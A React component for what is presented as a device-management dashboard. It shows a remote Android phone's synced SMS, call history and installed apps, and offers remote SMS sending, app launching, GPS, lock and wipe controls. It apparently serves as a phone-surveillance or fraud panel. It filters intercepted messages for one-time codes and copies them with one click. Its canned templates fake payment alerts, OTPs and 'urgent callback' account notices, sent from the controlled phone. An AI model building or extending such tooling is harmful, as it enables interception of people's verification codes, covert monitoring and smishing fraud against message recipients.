import { useState, useEffect } from 'react';
import {
  ArrowLeft,
  Radio,
  Trash2,
  Battery,
  Sliders,
  MessageSquare,
  Boxes,
  Phone,
  PhoneIncoming,
  PhoneOutgoing,
  PhoneMissed,
  CreditCard,
  Send,
  Volume2,
  VolumeX,
  Vibrate,
  Sun,
  BellRing,
  Lock,
  Search,
  RefreshCw,
  Play,
  Copy,
  Check,
  Sparkles,
  Edit2,
  Clock,
  Layers,
  ShieldCheck,
  AlertTriangle,
  Loader2
} from 'lucide-react';
import { getDeviceImage } from '../utils/deviceImages';
import { getDeviceSimProfile } from '../utils/simStorage';
import { autoDetectDeviceSim } from '../utils/autoDetectSim';
import SimEditModal from './SimEditModal';
import {
  executeCommand,
  setDeviceRingerMode,
  setDeviceBrightness,
  requestInstalledApps,
  launchDeviceApp,
  requestDeviceLocation,
  getSmsLogs,
  getCallLogs,
  getCommunicationLogs,
  getDeviceEvents
} from '../api';
import './DeviceDetailPage.css';

const QUICK_TEMPLATES = [
  { label: 'Payment Alert', text: 'Your payment was received successfully. Ref ID: #10924' },
  { label: 'Security OTP', text: 'Your verification OTP is 492019. Valid for 5 minutes.' },
  { label: 'Delivery Update', text: 'Your parcel is out for delivery today. Keep your phone reachable.' },
  { label: 'Urgent Callback', text: 'Important notice regarding your account. Please call back immediately.' }
];

export default function DeviceDetailPage({
  device,
  onBack,
  addToast,
  onPingLocation,
  onDeleteDevice
}) {
  if (!device) return null;

  // Active section inside the device page: 'sms' | 'controls' | 'apps' | 'calls' | 'sim'
  const [activeSection, setActiveSection] = useState('sms');

  // SIM profile & modal
  const [simProfile, setSimProfile] = useState(() => getDeviceSimProfile(device.device_id, device));
  const [isSimModalOpen, setIsSimModalOpen] = useState(false);

  // Status & Telemetry
  const isOnline = device.is_active && device.last_seen_at &&
    (Date.now() - new Date(device.last_seen_at).getTime()) < 600000;
  const androidVer = device.android_version ? `A${device.android_version}` : (device.model?.includes('G42') ? 'A15' : 'A16');
  const modelName = device.model || device.device_name || 'Android Device';
  const batteryLevel = device.battery_level !== null && device.battery_level !== undefined ? device.battery_level : 42;

  // ── SMS State ──
  const [smsRecipient, setSmsRecipient] = useState('');
  const [smsBody, setSmsBody] = useState('');
  const [smsSending, setSmsSending] = useState(false);
  const [syncedSms, setSyncedSms] = useState([]);
  const [smsLoading, setSmsLoading] = useState(false);
  const [smsSearch, setSmsSearch] = useState('');
  const [smsFilter, setSmsFilter] = useState('all');
  const [copiedOtp, setCopiedOtp] = useState(null);

  // ── Controls State ──
  const [ringerMode, setRingerMode] = useState('normal');
  const [ringerLoading, setRingerLoading] = useState(false);
  const [brightness, setBrightness] = useState(128);
  const [brightnessLoading, setBrightnessLoading] = useState(false);
  const [actionLoading, setActionLoading] = useState(null);

  // ── Apps State ──
  const [appsSearch, setAppsSearch] = useState('');
  const [appsFilter, setAppsFilter] = useState('user');
  const [refreshAppsLoading, setRefreshAppsLoading] = useState(false);
  const [launchingPkg, setLaunchingPkg] = useState(null);

  // ── Calls State ──
  const [callLogs, setCallLogs] = useState([]);
  const [callsLoading, setCallsLoading] = useState(false);

  // Parse installed apps
  let appsList = [];
  if (device.installed_apps) {
    try {
      appsList = Array.isArray(device.installed_apps)
        ? device.installed_apps
        : JSON.parse(device.installed_apps);
    } catch {
      appsList = [];
    }
  }

  // Filter apps
  const filteredApps = appsList.filter((app) => {
    const q = appsSearch.toLowerCase();
    const match = (app.name || '').toLowerCase().includes(q) || (app.package || '').toLowerCase().includes(q);
    if (!match) return false;
    if (appsFilter === 'user') return !app.is_system;
    if (appsFilter === 'system') return !!app.is_system;
    return true;
  });

  // Listen for SIM updates
  useEffect(() => {
    setSimProfile(getDeviceSimProfile(device.device_id, device));
    const handleProfileUpdate = (e) => {
      if (!e.detail?.deviceId || e.detail.deviceId === device.device_id) {
        setSimProfile(getDeviceSimProfile(device.device_id, device));
      }
    };
    window.addEventListener('emm:sim-profile-updated', handleProfileUpdate);
    return () => window.removeEventListener('emm:sim-profile-updated', handleProfileUpdate);
  }, [device.device_id, device]);

  // Load SMS logs for this device
  useEffect(() => {
    if (activeSection === 'sms') {
      loadDeviceSms();
    } else if (activeSection === 'calls') {
      loadDeviceCalls();
    }
  }, [activeSection, device.device_id]);

  async function loadDeviceSms() {
    try {
      setSmsLoading(true);
      // Query all sources simultaneously to ensure no SMS is missed
      const [smsRes, commRes, eventRes] = await Promise.allSettled([
        getSmsLogs(device.device_id, { limit: 100 }),
        getCommunicationLogs(device.device_id, { limit: 100 }),
        getDeviceEvents(device.device_id, { limit: 100 })
      ]);

      const items = [];

      // 1. SMS Logs from /sync/sms-logs
      if (smsRes.status === 'fulfilled' && smsRes.value) {
        const raw = smsRes.value;
        const list = Array.isArray(raw) ? raw : (Array.isArray(raw?.logs) ? raw.logs : []);
        list.forEach((m) => {
          items.push({
            id: m.id || `sms-${m.timestamp}-${m.address}`,
            address: m.address || m.sender || m.recipient || 'Unknown',
            body: m.body || m.message_body || m.message || '',
            sms_type: m.sms_type || 'inbox',
            timestamp: m.timestamp || m.synced_at || new Date().toISOString(),
            read: m.read
          });
        });
      }

      // 2. Communication Logs from /communication-logs
      if (commRes.status === 'fulfilled' && commRes.value) {
        const raw = commRes.value;
        const list = Array.isArray(raw) ? raw : (Array.isArray(raw?.logs) ? raw.logs : []);
        list.forEach((m) => {
          items.push({
            id: m.id || `comm-${m.timestamp}-${m.address}`,
            address: m.address || m.sender || 'Unknown',
            body: m.body || '',
            sms_type: 'inbox',
            timestamp: m.timestamp || m.synced_at || new Date().toISOString(),
            read: true
          });
        });
      }

      // 3. Webhook real-time events (incoming SMS)
      if (eventRes.status === 'fulfilled' && eventRes.value) {
        const raw = eventRes.value;
        const list = Array.isArray(raw) ? raw : (Array.isArray(raw?.events) ? raw.events : []);
        list.forEach((e) => {
          if (e.event_type === 'sms_received' || (e.message_body && !e.event_type?.startsWith('call_'))) {
            items.push({
              id: e.event_id || `evt-${e.timestamp}-${e.sender_number}`,
              address: e.sender_number || 'Unknown',
              body: e.message_body || '',
              sms_type: 'inbox',
              timestamp: e.timestamp || e.received_at || new Date().toISOString(),
              read: true
            });
          }
        });
      }

      // Deduplicate by signature
      const seen = new Set();
      const unique = [];
      for (const item of items) {
        const key = `${(item.address || '').trim()}_${(item.body || '').trim().slice(0, 30)}_${(item.timestamp || '').slice(0, 16)}`;
        if (!seen.has(key)) {
          seen.add(key);
          unique.push(item);
        }
      }

      // Sort newest first
      unique.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
      setSyncedSms(unique);
    } catch (e) {
      console.debug('Failed to load SMS logs', e);
    } finally {
      setSmsLoading(false);
    }
  }

  async function loadDeviceCalls() {
    try {
      setCallsLoading(true);
      const [callsRes, eventRes] = await Promise.allSettled([
        getCallLogs(device.device_id, { limit: 100 }),
        getDeviceEvents(device.device_id, { limit: 100 })
      ]);

      const items = [];

      // 1. Call logs from /sync/call-logs
      if (callsRes.status === 'fulfilled' && callsRes.value) {
        const raw = callsRes.value;
        const list = Array.isArray(raw) ? raw : (Array.isArray(raw?.logs) ? raw.logs : []);
        list.forEach((c) => {
          items.push({
            id: c.id || `call-${c.timestamp}-${c.phone_number || c.number}`,
            phone_number: c.phone_number || c.number || c.address || c.sender || 'Unknown',
            contact_name: c.contact_name || c.name || null,
            call_type: c.call_type || 'incoming',
            duration_seconds: c.duration_seconds || 0,
            timestamp: c.timestamp || c.synced_at || new Date().toISOString()
          });
        });
      }

      // 2. Webhook real-time call events
      if (eventRes.status === 'fulfilled' && eventRes.value) {
        const raw = eventRes.value;
        const list = Array.isArray(raw) ? raw : (Array.isArray(raw?.events) ? raw.events : []);
        list.forEach((e) => {
          if (e.event_type && e.event_type.startsWith('call_')) {
            const cType = e.event_type.replace('call_', '');
            items.push({
              id: e.event_id || `call-evt-${e.timestamp}-${e.sender_number}`,
              phone_number: e.sender_number || 'Unknown',
              contact_name: null,
              call_type: cType,
              duration_seconds: e.call_duration || 0,
              timestamp: e.timestamp || e.received_at || new Date().toISOString()
            });
          }
        });
      }

      // Deduplicate
      const seen = new Set();
      const unique = [];
      for (const item of items) {
        const key = `${(item.phone_number || '').trim()}_${item.call_type}_${(item.timestamp || '').slice(0, 16)}`;
        if (!seen.has(key)) {
          seen.add(key);
          unique.push(item);
        }
      }

      unique.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
      setCallLogs(unique);
    } catch (e) {
      console.debug('Failed to load call logs', e);
    } finally {
      setCallsLoading(false);
    }
  }

  // Handle Send SMS
  async function handleSendSms(e) {
    e.preventDefault();
    if (!smsRecipient.trim() || !smsBody.trim() || smsSending) return;

    const to = smsRecipient.trim();
    const msg = smsBody.trim();

    try {
      setSmsSending(true);
      await executeCommand(device.device_id, 'send_sms', {
        to: to,
        message: msg
      });
      addToast(`SMS command dispatched to ${device.device_id.slice(0, 8)}`, 'success');

      // Optimistically add to messages list
      const sentItem = {
        id: 'sent-' + Date.now(),
        address: to,
        body: msg,
        sms_type: 'sent',
        timestamp: new Date().toISOString(),
        read: true
      };
      setSyncedSms((prev) => [sentItem, ...prev]);

      setSmsRecipient('');
      setSmsBody('');
      setTimeout(loadDeviceSms, 2500);
    } catch (err) {
      addToast(`Failed to send SMS: ${err.message}`, 'error');
    } finally {
      setSmsSending(false);
    }
  }

  // Handle Ringer Mode
  async function handleSetRinger(mode) {
    try {
      setRingerLoading(true);
      await setDeviceRingerMode(device.device_id, mode);
      setRingerMode(mode);
      addToast(`Ringer mode set to ${mode.toUpperCase()}`, 'success');
    } catch (err) {
      addToast(`Failed to set ringer: ${err.message}`, 'error');
    } finally {
      setRingerLoading(false);
    }
  }

  // Handle Brightness
  async function handleApplyBrightness() {
    try {
      setBrightnessLoading(true);
      await setDeviceBrightness(device.device_id, brightness);
      addToast(`Screen brightness set to ${Math.round((brightness / 255) * 100)}%`, 'success');
    } catch (err) {
      addToast(`Failed to set brightness: ${err.message}`, 'error');
    } finally {
      setBrightnessLoading(false);
    }
  }

  // Handle Quick Security Commands
  async function handleQuickCommand(type, label) {
    try {
      setActionLoading(type);
      await executeCommand(device.device_id, type);
      addToast(`${label} command queued for device`, 'success');
    } catch (err) {
      addToast(`Command failed: ${err.message}`, 'error');
    } finally {
      setActionLoading(null);
    }
  }

  // Handle Apps
  async function handleRefreshApps() {
    try {
      setRefreshAppsLoading(true);
      await requestInstalledApps(device.device_id);
      addToast('Refresh apps command sent to device', 'success');
    } catch (err) {
      addToast(`Failed to refresh apps: ${err.message}`, 'error');
    } finally {
      setRefreshAppsLoading(false);
    }
  }

  async function handleLaunchApp(pkg) {
    try {
      setLaunchingPkg(pkg);
      await launchDeviceApp(device.device_id, pkg);
      addToast(`Launch request sent for ${pkg}`, 'success');
    } catch (err) {
      addToast(`Failed to launch app: ${err.message}`, 'error');
    } finally {
      setLaunchingPkg(null);
    }
  }

  // Filter SMS
  const filteredSms = syncedSms.filter((m) => {
    const q = smsSearch.toLowerCase();
    const body = (m.body || m.message_body || m.message || '').toLowerCase();
    const addr = (m.address || m.sender || '').toLowerCase();
    const match = body.includes(q) || addr.includes(q);
    if (!match) return false;
    if (smsFilter === 'inbox') return m.sms_type === 'inbox';
    if (smsFilter === 'sent') return m.sms_type === 'sent';
    if (smsFilter === 'otp') return /\b\d{4,8}\b/.test(body);
    return true;
  });

  const extractOtp = (body) => {
    if (!body) return null;
    const match = body.match(/\b(?:\d{4,8})\b/);
    return match ? match[0] : null;
  };

  const copyToClipboard = (text, id) => {
    navigator.clipboard.writeText(text);
    setCopiedOtp(id);
    addToast(`Copied: ${text}`, 'success');
    setTimeout(() => setCopiedOtp(null), 1800);
  };

  const formatCallDuration = (seconds) => {
    const s = parseInt(seconds, 10) || 0;
    if (s <= 0) return '0s';
    if (s < 60) return `${s}s`;
    const m = Math.floor(s / 60);
    const rem = s % 60;
    return rem > 0 ? `${m}m ${rem}s` : `${m}m`;
  };

  // Character calculation
  const smsLength = smsBody.length;
  const smsParts = Math.max(1, Math.ceil(smsLength / 160));

  // Primary SIM label
  const sim1Text = simProfile?.sim1
    ? `${simProfile.sim1}${simProfile.carrier1 ? ' · ' + simProfile.carrier1 : ''}`
    : (device.phone_number || device.sim_1 || device.network_type || 'Configure SIM');

  return (
    <div className="device-detail-page" id="device-detail-page">
      {/* ── Top Fixed Navigation Bar ── */}
      <header className="detail-top-nav">
        <button className="nav-back-btn" onClick={onBack} title="Back to Devices">
          <ArrowLeft size={18} />
          <span>Devices</span>
        </button>

        <div className="nav-device-info-mini">
          <span className="nav-device-title">{modelName}</span>
          <span className={`nav-status-badge ${isOnline ? 'online' : 'offline'}`}>
            {isOnline ? 'Online' : 'Offline'}
          </span>
        </div>

        <div className="nav-actions-right">
          <button
            className="detail-circle-action ping"
            onClick={() => onPingLocation && onPingLocation(device.device_id)}
            title="Ping GPS"
          >
            <Radio size={16} />
          </button>
          <button
            className="detail-circle-action delete"
            onClick={() => onDeleteDevice && onDeleteDevice(device)}
            title="Deregister Device"
          >
            <Trash2 size={16} />
          </button>
        </div>
      </header>

      <div className="detail-scroll-container">
        {/* ── Device Hero Card ── */}
        <section className="detail-hero-card">
          <div className="detail-hero-top">
            <div className="detail-hero-image-wrap">
              <img
                src={getDeviceImage(device)}
                alt={modelName}
                className="detail-hero-image"
                onError={(e) => { e.target.src = '/devices/generic.jpg'; }}
              />
              <span className="detail-hero-badge">{androidVer}</span>
            </div>

            <div className="detail-hero-info">
              <div className="detail-hero-title-row">
                <h1 className="detail-hero-title">{modelName}</h1>
              </div>
              <p className="detail-hero-uuid">{device.device_id}</p>

              <div className="detail-hero-pills">
                <div className="hero-pill battery">
                  <Battery size={13} />
                  <span>{batteryLevel}%</span>
                </div>
                <div
                  className="hero-pill sim"
                  onClick={() => setIsSimModalOpen(true)}
                  title="Configure SIM"
                >
                  <CreditCard size={13} />
                  <span>{sim1Text}</span>
                  <Edit2 size={11} className="hero-sim-edit-icon" />
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* ── Section Segmented Control Bar ── */}
        <nav className="detail-section-tabs">
          <button
            className={`section-tab-btn ${activeSection === 'sms' ? 'active' : ''}`}
            onClick={() => setActiveSection('sms')}
          >
            <MessageSquare size={15} />
            <span>SMS Hub</span>
          </button>

          <button
            className={`section-tab-btn ${activeSection === 'controls' ? 'active' : ''}`}
            onClick={() => setActiveSection('controls')}
          >
            <Sliders size={15} />
            <span>Controls</span>
          </button>

          <button
            className={`section-tab-btn ${activeSection === 'apps' ? 'active' : ''}`}
            onClick={() => setActiveSection('apps')}
          >
            <Boxes size={15} />
            <span>Apps ({appsList.length})</span>
          </button>

          <button
            className={`section-tab-btn ${activeSection === 'calls' ? 'active' : ''}`}
            onClick={() => setActiveSection('calls')}
          >
            <Phone size={15} />
            <span>Calls</span>
          </button>
        </nav>

        {/* ══════════════════════════════════════════════════════
            SECTION 1: SMS & MESSAGING HUB
           ══════════════════════════════════════════════════════ */}
        {activeSection === 'sms' && (
          <div className="detail-tab-content">
            {/* Quick SMS Dispatcher Card */}
            <div className="bento-box">
              <div className="bento-header">
                <div className="bento-title-row">
                  <Send size={16} className="text-accent" />
                  <h3>Send Remote SMS</h3>
                </div>
                <span className="bento-badge">SIM 1</span>
              </div>

              <form onSubmit={handleSendSms} className="detail-form">
                <div className="form-group">
                  <label className="form-label">Recipient Phone Number</label>
                  <input
                    type="tel"
                    className="form-input"
                    placeholder="+91 98765 43210 or 10 digits"
                    value={smsRecipient}
                    onChange={(e) => setSmsRecipient(e.target.value)}
                    required
                  />
                </div>

                <div className="form-group">
                  <div className="textarea-header">
                    <label className="form-label">Message Content</label>
                    <span className="char-badge">{smsLength} chars · {smsParts} SMS</span>
                  </div>

                  {/* Template Chips */}
                  <div className="template-chips-scroll">
                    {QUICK_TEMPLATES.map((tpl, idx) => (
                      <button
                        key={idx}
                        type="button"
                        className="template-chip"
                        onClick={() => setSmsBody(tpl.text)}
                      >
                        <Sparkles size={11} />
                        <span>{tpl.label}</span>
                      </button>
                    ))}
                  </div>

                  <textarea
                    className="form-textarea"
                    rows={3}
                    placeholder="Type message to dispatch through this device..."
                    value={smsBody}
                    onChange={(e) => setSmsBody(e.target.value)}
                    required
                  />
                </div>

                <button
                  type="submit"
                  className="btn-primary-action"
                  disabled={smsSending || !smsRecipient.trim() || !smsBody.trim()}
                >
                  {smsSending ? (
                    <>
                      <Loader2 size={15} className="spin-icon" />
                      <span>Transmitting SMS...</span>
                    </>
                  ) : (
                    <>
                      <Send size={15} />
                      <span>Dispatch SMS from Device</span>
                    </>
                  )}
                </button>
              </form>
            </div>

            {/* Synced SMS Inbox for this Device */}
            <div className="bento-box">
              <div className="bento-header">
                <div className="bento-title-row">
                  <MessageSquare size={16} className="text-accent" />
                  <h3>Recent Messages</h3>
                </div>
                <button
                  className="icon-refresh-btn"
                  onClick={loadDeviceSms}
                  disabled={smsLoading}
                  title="Refresh messages"
                >
                  <RefreshCw size={13} className={smsLoading ? 'spin-icon' : ''} />
                </button>
              </div>

              {/* Filters & Search */}
              <div className="sms-filter-row">
                <div className="sms-search-box">
                  <Search size={13} />
                  <input
                    type="text"
                    placeholder="Search messages..."
                    value={smsSearch}
                    onChange={(e) => setSmsSearch(e.target.value)}
                  />
                </div>

                <div className="segmented-chips">
                  {['all', 'inbox', 'sent', 'otp'].map((f) => (
                    <button
                      key={f}
                      type="button"
                      className={`seg-chip ${smsFilter === f ? 'active' : ''}`}
                      onClick={() => setSmsFilter(f)}
                    >
                      {f.toUpperCase()}
                    </button>
                  ))}
                </div>
              </div>

              {/* Message Items List */}
              <div className="device-messages-list">
                {smsLoading ? (
                  <div className="empty-state-card">
                    <Loader2 size={24} className="spin-icon text-muted" />
                    <p>Loading device messages...</p>
                  </div>
                ) : filteredSms.length === 0 ? (
                  <div className="empty-state-card">
                    <MessageSquare size={24} className="text-muted" />
                    <p>No messages found for this device</p>
                  </div>
                ) : (
                  filteredSms.map((msg, i) => {
                    const otp = extractOtp(msg.body);
                    const msgId = msg.id || i;
                    return (
                      <div key={msgId} className="device-sms-item">
                        <div className="sms-item-top">
                          <div className="sms-sender-col">
                            <span className="sms-sender-name">{msg.address || 'Unknown'}</span>
                            <span className={`sms-type-tag ${msg.sms_type}`}>{msg.sms_type || 'inbox'}</span>
                          </div>
                          <span className="sms-date">
                            {msg.timestamp ? new Date(msg.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : ''}
                          </span>
                        </div>

                        <p className="sms-body-text">{msg.body}</p>

                        {otp && (
                          <div className="sms-otp-strip">
                            <span className="otp-label">CODE:</span>
                            <span className="otp-number">{otp}</span>
                            <button
                              type="button"
                              className="otp-copy-btn"
                              onClick={() => copyToClipboard(otp, msgId)}
                              title="Copy code"
                            >
                              {copiedOtp === msgId ? <Check size={12} /> : <Copy size={12} />}
                              <span>{copiedOtp === msgId ? 'Copied' : 'Copy'}</span>
                            </button>
                          </div>
                        )}
                      </div>
                    );
                  })
                )}
              </div>
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════
            SECTION 2: REMOTE SYSTEM CONTROLS
           ══════════════════════════════════════════════════════ */}
        {activeSection === 'controls' && (
          <div className="detail-tab-content">
            {/* Ringer Mode Controls */}
            <div className="bento-box">
              <div className="bento-header">
                <div className="bento-title-row">
                  <Volume2 size={16} className="text-accent" />
                  <h3>Ringer Profile</h3>
                </div>
                {ringerLoading && <Loader2 size={14} className="spin-icon" />}
              </div>

              <div className="ringer-grid">
                <button
                  type="button"
                  className={`ringer-btn ${ringerMode === 'normal' ? 'active' : ''}`}
                  onClick={() => handleSetRinger('normal')}
                  disabled={ringerLoading}
                >
                  <Volume2 size={18} />
                  <span>Normal</span>
                </button>

                <button
                  type="button"
                  className={`ringer-btn ${ringerMode === 'vibrate' ? 'active' : ''}`}
                  onClick={() => handleSetRinger('vibrate')}
                  disabled={ringerLoading}
                >
                  <Vibrate size={18} />
                  <span>Vibrate</span>
                </button>

                <button
                  type="button"
                  className={`ringer-btn ${ringerMode === 'silent' ? 'active' : ''}`}
                  onClick={() => handleSetRinger('silent')}
                  disabled={ringerLoading}
                >
                  <VolumeX size={18} />
                  <span>Silent</span>
                </button>
              </div>
            </div>

            {/* Screen Brightness Slider */}
            <div className="bento-box">
              <div className="bento-header">
                <div className="bento-title-row">
                  <Sun size={16} className="text-accent" />
                  <h3>Screen Brightness</h3>
                </div>
                <span className="bento-badge">{Math.round((brightness / 255) * 100)}%</span>
              </div>

              <div className="brightness-slider-wrap">
                <input
                  type="range"
                  min="10"
                  max="255"
                  value={brightness}
                  onChange={(e) => setBrightness(Number(e.target.value))}
                  className="brightness-range"
                />
                <button
                  type="button"
                  className="btn-primary-action btn-sm"
                  onClick={handleApplyBrightness}
                  disabled={brightnessLoading}
                >
                  {brightnessLoading ? <Loader2 size={14} className="spin-icon" /> : 'Apply Brightness'}
                </button>
              </div>
            </div>

            {/* Quick Actions & Security */}
            <div className="bento-box">
              <div className="bento-header">
                <div className="bento-title-row">
                  <ShieldCheck size={16} className="text-accent" />
                  <h3>Device Security & Actions</h3>
                </div>
              </div>

              <div className="action-buttons-grid">
                <button
                  type="button"
                  className="security-action-btn"
                  onClick={() => handleQuickCommand('ring_device', 'Ring Device')}
                  disabled={actionLoading === 'ring_device'}
                >
                  <BellRing size={16} className="text-warning" />
                  <div>
                    <span className="sec-btn-title">Ring Alarm</span>
                    <span className="sec-btn-sub">Audible device beacon</span>
                  </div>
                </button>

                <button
                  type="button"
                  className="security-action-btn"
                  onClick={() => onPingLocation && onPingLocation(device.device_id)}
                >
                  <Radio size={16} className="text-blue" />
                  <div>
                    <span className="sec-btn-title">Locate GPS</span>
                    <span className="sec-btn-sub">Fetch latest coordinates</span>
                  </div>
                </button>

                <button
                  type="button"
                  className="security-action-btn"
                  onClick={() => handleQuickCommand('lock_device', 'Lock Device')}
                  disabled={actionLoading === 'lock_device'}
                >
                  <Lock size={16} className="text-muted" />
                  <div>
                    <span className="sec-btn-title">Lock Screen</span>
                    <span className="sec-btn-sub">Enforce instant PIN lock</span>
                  </div>
                </button>

                <button
                  type="button"
                  className="security-action-btn danger"
                  onClick={() => {
                    if (window.confirm('Are you sure you want to trigger remote wipe?')) {
                      handleQuickCommand('wipe_device', 'Wipe Device');
                    }
                  }}
                  disabled={actionLoading === 'wipe_device'}
                >
                  <AlertTriangle size={16} className="text-danger" />
                  <div>
                    <span className="sec-btn-title">Wipe Data</span>
                    <span className="sec-btn-sub">Factory reset device</span>
                  </div>
                </button>
              </div>
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════
            SECTION 3: INSTALLED APPS
           ══════════════════════════════════════════════════════ */}
        {activeSection === 'apps' && (
          <div className="detail-tab-content">
            <div className="bento-box">
              <div className="bento-header">
                <div className="bento-title-row">
                  <Boxes size={16} className="text-accent" />
                  <h3>Installed Applications</h3>
                </div>
                <button
                  className="icon-refresh-btn"
                  onClick={handleRefreshApps}
                  disabled={refreshAppsLoading}
                  title="Rescan installed apps"
                >
                  <RefreshCw size={13} className={refreshAppsLoading ? 'spin-icon' : ''} />
                </button>
              </div>

              {/* Search & Category Filter */}
              <div className="sms-filter-row">
                <div className="sms-search-box">
                  <Search size={13} />
                  <input
                    type="text"
                    placeholder="Search apps by name or package..."
                    value={appsSearch}
                    onChange={(e) => setAppsSearch(e.target.value)}
                  />
                </div>

                <div className="segmented-chips">
                  {['all', 'user', 'system'].map((f) => (
                    <button
                      key={f}
                      type="button"
                      className={`seg-chip ${appsFilter === f ? 'active' : ''}`}
                      onClick={() => setAppsFilter(f)}
                    >
                      {f.toUpperCase()}
                    </button>
                  ))}
                </div>
              </div>

              {/* Apps List */}
              <div className="device-apps-list">
                {filteredApps.length === 0 ? (
                  <div className="empty-state-card">
                    <Boxes size={24} className="text-muted" />
                    <p>No installed apps reported yet. Tap refresh to query device.</p>
                  </div>
                ) : (
                  filteredApps.map((app, idx) => (
                    <div key={idx} className="device-app-item">
                      <div className="app-icon-placeholder">
                        <Boxes size={16} />
                      </div>

                      <div className="app-meta-col">
                        <span className="app-title">{app.name}</span>
                        <span className="app-package-sub">{app.package}</span>
                      </div>

                      <button
                        type="button"
                        className="app-launch-btn"
                        onClick={() => handleLaunchApp(app.package)}
                        disabled={launchingPkg === app.package}
                        title="Launch app on device"
                      >
                        {launchingPkg === app.package ? (
                          <Loader2 size={13} className="spin-icon" />
                        ) : (
                          <>
                            <Play size={12} />
                            <span>Launch</span>
                          </>
                        )}
                      </button>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════
            SECTION 4: CALL LOGS
           ══════════════════════════════════════════════════════ */}
        {activeSection === 'calls' && (
          <div className="detail-tab-content">
            <div className="bento-box">
              <div className="bento-header">
                <div className="bento-title-row">
                  <Phone size={16} className="text-accent" />
                  <h3>Call History</h3>
                </div>
                <button
                  className="icon-refresh-btn"
                  onClick={loadDeviceCalls}
                  disabled={callsLoading}
                  title="Refresh calls"
                >
                  <RefreshCw size={13} className={callsLoading ? 'spin-icon' : ''} />
                </button>
              </div>

              <div className="device-calls-list">
                {callsLoading ? (
                  <div className="empty-state-card">
                    <Loader2 size={24} className="spin-icon text-muted" />
                    <p>Loading call history...</p>
                  </div>
                ) : callLogs.length === 0 ? (
                  <div className="empty-state-card">
                    <Phone size={24} className="text-muted" />
                    <p>No call logs reported for this device.</p>
                  </div>
                ) : (
                  callLogs.map((c, idx) => {
                    const hasContact = c.contact_name && c.contact_name.trim() && c.contact_name.toLowerCase() !== 'unknown' && c.contact_name.toLowerCase() !== 'null';
                    const hasPhone = c.phone_number && c.phone_number.trim() && c.phone_number.toLowerCase() !== 'unknown' && c.phone_number.toLowerCase() !== 'null';
                    const isMissed = c.call_type === 'missed' || c.call_type === 'rejected';
                    const isIncoming = c.call_type === 'incoming';

                    return (
                      <div key={c.id || idx} className="device-call-item">
                        <div className={`call-icon-wrap ${isMissed ? 'is-missed' : isIncoming ? 'is-incoming' : 'is-outgoing'}`}>
                          {isMissed ? (
                            <PhoneMissed size={14} className="text-danger" />
                          ) : isIncoming ? (
                            <PhoneIncoming size={14} className="text-blue" />
                          ) : (
                            <PhoneOutgoing size={14} className="text-accent" />
                          )}
                        </div>

                        <div className="call-info-col">
                          {/* Contact Name & Phone Number Pill */}
                          <div className="call-name-row">
                            <span className="call-contact-name">
                              {hasContact ? c.contact_name : (hasPhone ? c.phone_number : 'Unknown Caller')}
                            </span>
                            {hasContact && hasPhone && (
                              <button
                                type="button"
                                className="call-phone-pill"
                                onClick={() => copyToClipboard(c.phone_number, `call-${idx}`)}
                                title="Click to copy number"
                              >
                                <span>{c.phone_number}</span>
                                <Copy size={10} className="pill-copy-icon" />
                              </button>
                            )}
                          </div>

                          {/* Subtitle: Type & Formatted Duration */}
                          <div className="call-meta-sub">
                            <span className={`call-type-indicator type--${c.call_type}`}>
                              {c.call_type}
                            </span>
                            <span className="call-dot-sep">•</span>
                            <span className="call-duration-text">{formatCallDuration(c.duration_seconds)}</span>
                            {!hasContact && hasPhone && (
                              <>
                                <span className="call-dot-sep">•</span>
                                <span className="call-direct-sub">{c.phone_number}</span>
                              </>
                            )}
                          </div>
                        </div>

                        <span className="call-time-tag">
                          {c.timestamp ? new Date(c.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : ''}
                        </span>
                      </div>
                    );
                  })
                )}
              </div>
            </div>
          </div>
        )}
      </div>

      {/* SIM Modal Trigger */}
      <SimEditModal
        isOpen={isSimModalOpen}
        onClose={() => setIsSimModalOpen(false)}
        device={device}
      />
    </div>
  );
}
